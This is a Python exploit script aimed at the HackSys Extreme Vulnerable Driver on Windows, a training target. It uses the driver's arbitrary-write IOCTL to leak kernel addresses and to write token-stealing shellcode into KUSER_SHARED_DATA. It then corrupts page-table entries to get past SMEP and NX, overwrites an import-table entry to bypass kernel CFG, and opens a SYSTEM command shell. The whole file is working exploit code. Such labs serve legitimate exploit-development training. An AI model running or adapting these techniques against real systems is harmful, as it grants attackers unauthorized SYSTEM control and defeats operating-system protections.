#arbit_overwrites
import struct
import sys
import os
from ctypes import *
import time

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi


KUSER_SHARED_DATA = 0xFFFFF78000000000

class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

class WriteWhatWhere_Shellcode_1(Structure):
    _fields_ = [
        ("What_Shellcode_1", c_void_p),
        ("Where_Shellcode_1", c_void_p)
    ]
class WriteWhatWhere_Shellcode_2(Structure):
    _fields_ = [
        ("What_Shellcode_2", c_void_p),
        ("Where_Shellcode_2", c_void_p)
    ]
class WriteWhatWhere_Shellcode_3(Structure):
    _fields_ = [
        ("What_Shellcode_3", c_void_p),
        ("Where_Shellcode_3", c_void_p)
    ]


class WriteWhatWhere_Shellcode_4(Structure):
    _fields_ = [
        ("What_Shellcode_4", c_void_p),
        ("Where_Shellcode_4", c_void_p)
    ]

class WriteWhatWhere_Shellcode_5(Structure):
    _fields_ = [
        ("What_Shellcode_5", c_void_p),
        ("Where_Shellcode_5", c_void_p)
    ]


class WriteWhatWhere_Shellcode_6(Structure):
    _fields_ = [
        ("What_Shellcode_6", c_void_p),
        ("Where_Shellcode_6", c_void_p)
    ]

class WriteWhatWhere_Shellcode_7(Structure):
    _fields_ = [
        ("What_Shellcode_7", c_void_p),
        ("Where_Shellcode_7", c_void_p)
    ]

class WriteWhatWhere_Shellcode_8(Structure):
    _fields_ = [
        ("What_Shellcode_8", c_void_p),
        ("Where_Shellcode_8", c_void_p)
    ]
class WriteWhatWhere_Shellcode_9(Structure):
    _fields_ = [
        ("What_Shellcode_9", c_void_p),
        ("Where_Shellcode_9", c_void_p)
    ]

class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]
class WriteWhatWhere_PTE_Control_Bits1(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits1", c_void_p),
        ("Where_PTE_Control_Bits1", c_void_p)
    ]

class WriteWhatWhere_PTE_Overwrite1(Structure):
    _fields_ = [
        ("What_PTE_Overwrite1", c_void_p),
        ("Where_PTE_Overwrite1", c_void_p)
    ]

class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

"""
Token stealing payload
\x65\x48\x8B\x04\x25\x88\x01\x00\x00              # mov rax,[gs:0x188]  ; 
\x48\x8B\x80\xB8\x00\x00\x00                      # mov rax,[rax+0xb8]  ; 
\x48\x89\xC3                                      # mov rbx,rax         ;
\x48\x8B\x9B\xF0\x02\x00\x00                      # mov rbx,[rbx+0x2f0] ; 
\x48\x81\xEB\xF0\x02\x00\x00                      # sub rbx,0x2f0       ; 
\x48\x8B\x8B\xE8\x02\x00\x00                      # mov rcx,[rbx+0x2e8] ; 
\x48\x83\xF9\x04                                  # cmp rcx,byte +0x4   ; 
\x75\xE5                                          # jnz 0x13            ; 
\x48\x8B\x8B\x60\x03\x00\x00                      # mov rcx,[rbx+0x360] ; 
\x80\xE1\xF0                                      # and cl, 0xf0        ; 
\x48\x89\x88\x60\x03\x00\x00                      # mov [rax+0x360],rcx ; 
\x48\x31\xC0                                      # xor rax,rax         ; 
\xC3                                              # ret                 ; 
)
"""
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      
    sizeof(base),                     
    byref(c_long())                   
)

if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

kernel_address = base[0]

print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

time.sleep(0.2)

for base_address in base:
    if not base_address:
        continue
    current_name = c_char_p('\x00' * 1024)
    psapi.GetDeviceDriverBaseNameA.argtypes = [c_ulonglong, POINTER(c_char), c_uint32]
    driver_name = psapi.GetDeviceDriverBaseNameA(
        base_address,                 # ImageBase (load address of current device driver)
        current_name,                 # lpFilename
        48                            # nSize (size of the buffer, in chars)
    )

    if not driver_name:
        print "[-] Unable to enumerate driver!"
        sys.exit(-1)

    if current_name.value.lower() == 'HEVD' or 'hevd' in current_name.value.lower():
        hevd_base = current_name.value
        print "[+] driver is located at: {0}".format(hex(base_address))

        time.sleep(0.2)

        break


hevd_base = base_address
nt_mi_get_pte_address = kernel_address + 0xbadc8

print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

time.sleep(0.2)

pte_base = nt_mi_get_pte_address + 0x13

print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

time.sleep(0.2)

base_of_ptes_pointer = c_void_p()

www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

handle = kernel32.CreateFileA(
    "\\\\.\\Driver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_pte_pointer,                       # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

print "[+] Leaked base of PTEs!"

time.sleep(0.2)
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))

time.sleep(0.2)
kuser_shared_data_800_pte_address = KUSER_SHARED_DATA + 0x800 >> 9
kuser_shared_data_800_pte_address &= 0x7ffffffff8
kuser_shared_data_800_pte_address += base_of_ptes
print "[+] PTE for KUSER_SHARED_DATA + 0x800 is located at {0}".format(hex(kuser_shared_data_800_pte_address))

time.sleep(0.2)

first_shellcode = c_ulonglong(0x00018825048B4865)
www_shellcode_one = WriteWhatWhere_Shellcode_1()
www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
www_shellcode_one_pointer = pointer(www_shellcode_one)

print "[+] Writing first 8 bytes of shellcode to KUSER_SHARED_DATA + 0x800..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_shellcode_one_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

second_shellcode = c_ulonglong(0x000000B8808B4800)

www_shellcode_two = WriteWhatWhere_Shellcode_2()
www_shellcode_two.What_Shellcode_2 = addressof(second_shellcode)
www_shellcode_two.Where_Shellcode_2 = KUSER_SHARED_DATA + 0x808
www_shellcode_two_pointer = pointer(www_shellcode_two)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x808..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_shellcode_two_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

third_shellcode = c_ulonglong(0x02F09B8B48C38948)

www_shellcode_three = WriteWhatWhere_Shellcode_3()
www_shellcode_three.What_Shellcode_3 = addressof(third_shellcode)
www_shellcode_three.Where_Shellcode_3 = KUSER_SHARED_DATA + 0x810
www_shellcode_three_pointer = pointer(www_shellcode_three)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x810..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_three_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

fourth_shellcode = c_ulonglong(0x0002F0EB81480000)

www_shellcode_four = WriteWhatWhere_Shellcode_4()
www_shellcode_four.What_Shellcode_4 = addressof(fourth_shellcode)
www_shellcode_four.Where_Shellcode_4 = KUSER_SHARED_DATA + 0x818
www_shellcode_four_pointer = pointer(www_shellcode_four)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x818..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_four_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

fifth_shellcode = c_ulonglong(0x000002E88B8B4800)

www_shellcode_five = WriteWhatWhere_Shellcode_5()
www_shellcode_five.What_Shellcode_5 = addressof(fifth_shellcode)
www_shellcode_five.Where_Shellcode_5 = KUSER_SHARED_DATA + 0x820
www_shellcode_five_pointer = pointer(www_shellcode_five)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x820..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_five_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

sixth_shellcode = c_ulonglong(0x8B48E57504F98348)

www_shellcode_six = WriteWhatWhere_Shellcode_6()
www_shellcode_six.What_Shellcode_6 = addressof(sixth_shellcode)
www_shellcode_six.Where_Shellcode_6 = KUSER_SHARED_DATA + 0x828
www_shellcode_six_pointer = pointer(www_shellcode_six)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x828..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_six_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

seventh_shellcode = c_ulonglong(0xF0E180000003608B)

www_shellcode_seven = WriteWhatWhere_Shellcode_7()
www_shellcode_seven.What_Shellcode_7 = addressof(seventh_shellcode)
www_shellcode_seven.Where_Shellcode_7 = KUSER_SHARED_DATA + 0x830
www_shellcode_seven_pointer = pointer(www_shellcode_seven)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x830..."

kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_seven_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

eighth_shellcode = c_ulonglong(0x4800000360888948)

www_shellcode_eight = WriteWhatWhere_Shellcode_8()
www_shellcode_eight.What_Shellcode_8 = addressof(eighth_shellcode)
www_shellcode_eight.Where_Shellcode_8 = KUSER_SHARED_DATA + 0x838
www_shellcode_eight_pointer = pointer(www_shellcode_eight)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x838..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_eight_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

ninth_shellcode = c_ulonglong(0x0000000000C3C031)

www_shellcode_nine = WriteWhatWhere_Shellcode_9()
www_shellcode_nine.What_Shellcode_9 = addressof(ninth_shellcode)
www_shellcode_nine.Where_Shellcode_9 = KUSER_SHARED_DATA + 0x840
www_shellcode_nine_pointer = pointer(www_shellcode_nine)

print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x840..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_nine_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

pte_bits_pointer = c_void_p()
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = kuser_shared_data_800_pte_address
www_pte_bits.Where_PTE_Control_Bits = addressof(pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

pte_control_bits_no_execute = struct.unpack('<Q', pte_bits_pointer)[0]

print "[+] PTE control bits for KUSER_SHARED_DATA + 0x800: {:016x}".format(pte_control_bits_no_execute)

time.sleep(0.2)

pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF
pte_overwrite_pointer = c_void_p(pte_control_bits_execute)
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = kuser_shared_data_800_pte_address
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

print "[+] Overwriting KUSER_SHARED_DATA + 0x800's PTE..."

time.sleep(0.2)
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

print "[+] KUSER_SHARED_DATA + 0x800 is now executable! See you later, SMEP!"

time.sleep(0.2)

#(https://docs.microsoft.com/en-us/windows/win32/secbp/pe-metadata#import-handling)


iat_entry = hevd_base+0x2010

print "[+] Import Address Table for HEVD.sys is located at: {0}".format(hex(iat_entry-0x10))

time.sleep(0.2)

print "[+] IAT entry for kCFG bypass is located at: {0}".format(hex(iat_entry))

time.sleep(0.2)
iat_pte_address = iat_entry >> 9
iat_pte_address &= 0x7ffffffff8
iat_pte_address += base_of_ptes
print "[+] PTE for IAT entry is located at: {0}".format(hex(iat_pte_address))

time.sleep(0.2)

pte_bits_pointer1 = c_void_p()
www_pte_bits1 = WriteWhatWhere_PTE_Control_Bits1()
www_pte_bits1.What_PTE_Control_Bits1 = iat_pte_address
www_pte_bits1.Where_PTE_Control_Bits1 = addressof(pte_bits_pointer1)
www_pte_bits_pointer1 = pointer(www_pte_bits1)
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer1,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

pte_control_bits_no_execute1 = struct.unpack('<Q', pte_bits_pointer1)[0]
print "[+] PTE control bits for IAT entry: {:016x}".format(pte_control_bits_no_execute1)

time.sleep(0.2)
pte_control_bits_execute1_temp = pte_control_bits_no_execute1 + 2

pte_control_bits_execute1 = pte_control_bits_execute1_temp & 0x0FFFFFFFFFFFFFFF

pte_overwrite_pointer1 = c_void_p(pte_control_bits_execute1)

www_pte_overwrite1 = WriteWhatWhere_PTE_Overwrite1()
www_pte_overwrite1.What_PTE_Overwrite1 = addressof(pte_overwrite_pointer1)
www_pte_overwrite1.Where_PTE_Overwrite1 = iat_pte_address
www_pte_overwrite_pointer1 = pointer(www_pte_overwrite1)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer1,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

print "[+] Corrupted PTE for IAT entry! IAT entry is now K/R/W/X!"

time.sleep(0.2)
KUSER_SHARED_DATA_LONGLONG = c_ulonglong(0xFFFFF78000000800)
www = WriteWhatWhere()
www.What = addressof(KUSER_SHARED_DATA_LONGLONG)
www.Where = iat_entry
www_pointer = pointer(www)
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pointer,                        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

buff = "\x41\x41\x41\x41\x41\x41\x41\x41\x41"
print "[+] Invoking IOCTL routine to call the corrupted IAT entry!"
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x00222013,                         # dwIoControlCode
    buff,                               # lpInBuffer
    len(buff),                          # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

print "[+] kCFG bypass done ;)"

time.sleep(0.2)

# Print update for shell
print "[+] NT AUTHORITY\SYSTEM shell!"
os.system("cmd.exe /K cd C:\\")
